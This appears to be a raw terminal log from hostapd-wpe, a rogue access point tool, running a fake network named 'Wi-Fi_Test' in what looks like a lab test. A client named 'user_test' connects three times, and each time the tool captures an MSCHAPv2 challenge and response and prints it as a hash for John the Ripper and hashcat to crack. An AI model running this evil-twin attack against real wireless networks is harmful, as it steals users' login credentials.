Configuration file: /etc/hostapd-wpe/hostapd-wpe.conf
Using interface wlan0 with hwaddr 00:c0:ca:a7:47:ea and ssid "Wi-Fi_Test"
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED



wlan0: STA 02:8f:40:64:2a:3d IEEE 802.11: associated
wlan0: CTRL-EVENT-EAP-STARTED 02:8f:40:64:2a:3d
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'


mschapv2: Mon Jun 13 15:59:30 2022
	 username:	user_test
	 challenge:	6d:c9:06:33:d7:28:45:f1
	 response:	5b:29:b5:6b:d8:b7:3c:f2:0a:90:bd:94:42:31:9b:77:96:0c:43:e0:ac:a3:d6:1c
	 jtr NETNTLM:		user_test:$NETNTLM$6dc90633d72845f1$5b29b56bd8b73cf20a90bd9442319b77960c43e0aca3d61c
	 hashcat NETNTLM:	user_test::::5b29b56bd8b73cf20a90bd9442319b77960c43e0aca3d61c:6dc90633d72845f1
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: CTRL-EVENT-EAP-FAILURE 02:8f:40:64:2a:3d
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.11: disassociated
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.11: associated
wlan0: CTRL-EVENT-EAP-STARTED 02:8f:40:64:2a:3d
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'


mschapv2: Mon Jun 13 15:59:42 2022
	 username:	user_test
	 challenge:	18:37:73:1c:f6:ef:26:f5
	 response:	d0:b0:54:f0:f6:c8:a7:a3:6f:ce:2e:b7:0f:0a:8f:ef:8e:8d:c1:82:68:05:f0:f3
	 jtr NETNTLM:		user_test:$NETNTLM$1837731cf6ef26f5$d0b054f0f6c8a7a36fce2eb70f0a8fef8e8dc1826805f0f3
	 hashcat NETNTLM:	user_test::::d0b054f0f6c8a7a36fce2eb70f0a8fef8e8dc1826805f0f3:1837731cf6ef26f5
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: CTRL-EVENT-EAP-FAILURE 02:8f:40:64:2a:3d
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.11: disassociated
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.11: associated
wlan0: CTRL-EVENT-EAP-STARTED 02:8f:40:64:2a:3d
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'


mschapv2: Mon Jun 13 15:59:45 2022
	 username:	user_test
	 challenge:	ec:02:41:bb:ba:b8:ee:ba
	 response:	c7:a3:58:aa:97:af:c5:f3:62:e2:df:04:48:f0:29:d7:37:03:e0:17:fa:57:d8:15
	 jtr NETNTLM:		user_test:$NETNTLM$ec0241bbbab8eeba$c7a358aa97afc5f362e2df0448f029d73703e017fa57d815
	 hashcat NETNTLM:	user_test::::c7a358aa97afc5f362e2df0448f029d73703e017fa57d815:ec0241bbbab8eeba
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Identity received from STA: 'user_test'
wlan0: CTRL-EVENT-EAP-FAILURE 02:8f:40:64:2a:3d
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
wlan0: STA 02:8f:40:64:2a:3d IEEE 802.11: disassociated
^Cwlan0: interface state ENABLED->DISABLED
wlan0: AP-DISABLED
wlan0: CTRL-EVENT-TERMINATING
nl80211: deinit ifname=wlan0 disabled_11b_rates=0
